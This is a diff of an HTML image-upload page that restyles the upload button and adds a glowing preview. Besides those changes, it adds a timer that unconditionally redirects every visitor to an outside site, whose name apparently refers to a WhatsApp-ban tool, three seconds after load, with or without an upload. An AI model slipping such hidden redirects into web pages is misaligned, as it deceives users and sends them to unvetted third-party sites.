@@ -7,63 +7,67 @@
     <style>
         body {
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
             margin: 0;
             background-color: #f4f4f4;
         }
         .upload-box {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 300px;
-            height: 300px;
-            border: 2px dashed #000;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: box-shadow 0.3s ease-in-out;
+            text-align: center;
         }
-        .upload-box:hover {
-            box-shadow: 0 0 15px 5px rgba(0, 0, 0, 0.5);
+        .upload-image {
+            display: none;
         }
-        .uploaded-image {
+        .preview-image {
+            display: none;
             margin-top: 20px;
-            width: 300px;
-            height: auto;
+            max-width: 300px;
+            border: 5px solid transparent;
+            border-radius: 10px;
+        }
+        .preview-image.show {
+            display: block;
+            animation: glow 3s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            0% {
+                border-color: rgba(0, 0, 255, 0.8);
+            }
+            100% {
+                border-color: rgba(0, 0, 255, 0);
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="upload-box" id="uploadBox">
-        <p>Click to Upload Image</p>
-        <input type="file" id="fileInput" style="display: none;" accept="image/*">
+    <div class="upload-box">
+        <input type="file" class="upload-image" accept="image/*" id="imageUpload">
+        <label for="imageUpload" style="cursor: pointer; padding: 10px 20px; background-color: #007BFF; color: white; border-radius: 5px; font-size: 16px;">
+            Upload Image
+        </label>
+        <img id="previewImage" class="preview-image" src="" alt="Uploaded Image">
     </div>
 
-    <img id="previewImage" class="uploaded-image" src="" alt="Uploaded Image" style="display: none;">
-
     <script>
-        document.getElementById('uploadBox').addEventListener('click', () => {
-            document.getElementById('fileInput').click();
-        });
-
-        document.getElementById('fileInput').addEventListener('change', (event) => {
-            const file = event.target.files[0];
+        document.getElementById('imageUpload').addEventListener('change', function() {
+            const file = this.files[0];
             if (file) {
                 const reader = new FileReader();
-                reader.onload = (e) => {
-                    document.getElementById('previewImage').src = e.target.result;
-                    document.getElementById('previewImage').style.display = 'block';
-                    setTimeout(() => {
-                        window.location.href = 'pair.html'; // Redirect to pair.html
-                    }, 2000); // Redirect after 2 seconds
+                reader.onload = function(e) {
+                    const previewImage = document.getElementById('previewImage');
+                    previewImage.src = e.target.result;
+                    previewImage.classList.add('show');
                 };
                 reader.readAsDataURL(file);
             }
         });
+
+        // Redirect to the specified URL after 3 seconds
+        setTimeout(() => {
+            window.location.href = "https://wp-ban-by-axl.vercel.app/";
+        }, 3000);
     </script>
 
 </body>
